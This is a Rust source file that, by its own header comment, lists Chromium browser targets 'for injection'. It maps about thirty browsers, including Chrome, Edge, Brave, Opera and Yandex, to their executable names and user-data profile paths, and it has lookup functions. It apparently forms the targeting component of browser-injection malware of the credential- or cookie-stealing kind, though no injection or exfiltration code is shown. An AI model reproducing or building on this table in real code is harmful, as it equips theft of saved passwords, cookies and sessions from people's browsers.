//! Chromium browser targets: exe name + user data path for injection.

#[derive(Clone, Copy)]
pub enum DataRoot {
    Local,
    Roaming,
}

#[derive(Clone, Copy)]
pub struct ChromiumTarget {
    pub name: &'static str,
    pub exe: &'static str,
    pub user_data_rel: &'static str,
    pub root: DataRoot,
}

pub const TARGETS: &[ChromiumTarget] = &[
    // Google Chrome
    ChromiumTarget { name: "Chrome", exe: "chrome.exe", user_data_rel: r"Google\Chrome\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Chrome Beta", exe: "chrome.exe", user_data_rel: r"Google\Chrome Beta\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Chrome Dev", exe: "chrome.exe", user_data_rel: r"Google\Chrome Dev\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Chrome Canary", exe: "chrome.exe", user_data_rel: r"Google\Chrome SxS\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Chromium", exe: "chrome.exe", user_data_rel: r"Chromium\User Data", root: DataRoot::Local },
    // Microsoft Edge
    ChromiumTarget { name: "Edge", exe: "msedge.exe", user_data_rel: r"Microsoft\Edge\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Edge Beta", exe: "msedge.exe", user_data_rel: r"Microsoft\Edge Beta\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Edge Dev", exe: "msedge.exe", user_data_rel: r"Microsoft\Edge Dev\User Data", root: DataRoot::Local },
    // Brave
    ChromiumTarget { name: "Brave", exe: "brave.exe", user_data_rel: r"BraveSoftware\Brave-Browser\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Brave Beta", exe: "brave.exe", user_data_rel: r"BraveSoftware\Brave-Browser-Beta\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Brave Nightly", exe: "brave.exe", user_data_rel: r"BraveSoftware\Brave-Browser-Nightly\User Data", root: DataRoot::Local },
    // Opera
    ChromiumTarget { name: "Opera", exe: "opera.exe", user_data_rel: r"Opera Software\Opera Stable", root: DataRoot::Roaming },
    ChromiumTarget { name: "OperaGX", exe: "opera.exe", user_data_rel: r"Opera Software\Opera GX Stable", root: DataRoot::Roaming },
    ChromiumTarget { name: "Opera Neon", exe: "opera.exe", user_data_rel: r"Opera Software\Opera Neon\User Data", root: DataRoot::Roaming },
    // Others
    ChromiumTarget { name: "Vivaldi", exe: "vivaldi.exe", user_data_rel: r"Vivaldi\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Yandex", exe: "browser.exe", user_data_rel: r"Yandex\YandexBrowser\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "CocCoc", exe: "browser.exe", user_data_rel: r"CocCoc\Browser\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "CentBrowser", exe: "chrome.exe", user_data_rel: r"CentBrowser\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "360Chrome", exe: "360chrome.exe", user_data_rel: r"360Chrome\Chrome\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Epic Privacy Browser", exe: "epic.exe", user_data_rel: r"Epic Privacy Browser\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Uran", exe: "uran.exe", user_data_rel: r"uCozMedia\Uran\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "7Star", exe: "7star.exe", user_data_rel: r"7Star\7Star\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Torch", exe: "torch.exe", user_data_rel: r"Torch\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Kometa", exe: "kometa.exe", user_data_rel: r"Kometa\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Orbitum", exe: "orbitum.exe", user_data_rel: r"Orbitum\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Amigo", exe: "amigo.exe", user_data_rel: r"Amigo\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Sputnik", exe: "sputnik.exe", user_data_rel: r"Sputnik\Sputnik\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Slimjet", exe: "slimjet.exe", user_data_rel: r"Slimjet\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Iridium", exe: "iridium.exe", user_data_rel: r"Iridium\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Thorium", exe: "thorium.exe", user_data_rel: r"Thorium\User Data", root: DataRoot::Local },
    ChromiumTarget { name: "Arc", exe: "Arc.exe", user_data_rel: r"The Browser Company\Arc\User Data", root: DataRoot::Local },
];

pub fn find_target(name: &str) -> Option<&'static ChromiumTarget> {
    TARGETS.iter().find(|t| t.name == name)
}

pub fn exe_for(name: &str) -> Option<&'static str> {
    find_target(name).map(|t| t.exe)
}
